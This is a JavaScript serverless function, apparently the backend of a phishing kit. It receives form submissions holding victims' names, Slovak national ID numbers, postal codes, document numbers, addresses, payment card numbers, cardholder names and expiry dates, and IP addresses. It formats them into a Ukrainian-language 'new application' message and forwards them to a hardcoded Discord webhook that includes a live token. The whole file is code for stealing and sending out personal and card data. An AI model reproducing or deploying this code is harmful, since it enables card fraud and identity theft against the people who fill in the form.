// netlify/functions/upload.js
exports.handler = async function(event, context) {
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  try {
    const data = JSON.parse(event.body);

    const webhookUrl = "https://discord.com/api/webhooks/1517213155590144250/ttXHJUd5VSbIQDkW6gSyflkwEzaoFQ-AXl-6VoiABNCXG4zQlLf1WD7fqMfPw9LkoeLH";

    let message = `🔔 **НОВА ЗАЯВКА — ПОВНИЙ ПАКЕТ!**\n\n`;

    // Дані з форми верифікації
    if (data.meno || data.priezvisko) {
      message += `**👤 Клієнт:** ${data.meno || ''} ${data.priezvisko || ''}\n`;
      message += `**🔑 Код менеджера:** ${data.secCode || '—'}\n\n`;
    }

    // Дані з квіза
    if (data.rodneCislo) message += `**Родне число:** ${data.rodneCislo}\n`;
    if (data.psc) message += `**PSČ:** ${data.psc}\n`;
    if (data.docNumber) message += `**Документ:** ${data.docNumber}\n`;
    if (data.address) message += `**Адреса:** ${data.address}\n`;

    // Дані з карти
    if (data.cardNumber) {
      message += `\n**💳 КАРТА:**\n`;
      message += `Номер: ${data.cardNumber}\n`;
      if (data.cardName) message += `Ім'я: ${data.cardName}\n`;
      if (data.cardExpiry) message += `Дійсна до: ${data.cardExpiry}\n`;
    }

    message += `\n**IP:** ${data.ip || '—'}\n`;
    message += `**Час:** ${new Date().toLocaleString('uk-UA')}`;

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: message })
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true })
    };

  } catch (error) {
    console.error(error);
    return { statusCode: 500, body: "Server Error" };
  }
};